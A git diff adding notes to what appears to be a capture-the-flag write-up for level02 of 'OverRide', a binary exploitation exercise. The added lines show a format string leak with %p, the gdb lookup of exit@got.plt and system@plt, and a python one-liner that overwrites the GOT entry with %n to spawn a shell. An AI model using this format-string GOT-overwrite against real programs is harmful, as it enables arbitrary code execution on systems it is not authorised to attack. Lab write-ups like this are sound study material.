@@ -74,3 +74,33 @@ else
   system (/bin/sh)
 ```
 
+Format String to overide the GOT
+
+```
+--[ Username: %p %p %p %p %p %p %p %p
+--[ Password: AAAA
+*****************************************
+0x7fffffffe4c0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6b8 0x1f7ff9a08 0x41414141
+```
+
+`(python -c 'print " %p " * 8 + "\n" + "AAAA"') | ./level02`
+
+```
+level02@OverRide:~$ (python -c 'print "%8$p" + "\n" + "AAAA"') | ./level02
+0x41414141 does not have access!
+```
+
+x/s 0x601228
+0x601228 <exit@got.plt>
+
+p 0x601228 = 6296104
+
+callq  0x4006b0 <system@plt>
+
+`(python -c 'print "%6296104p%8$n" + "\n" + "\x40\x06\xb0"[::-1]' ; cat) | ./level02 > /dev/null`
+
+
+
+
+
+
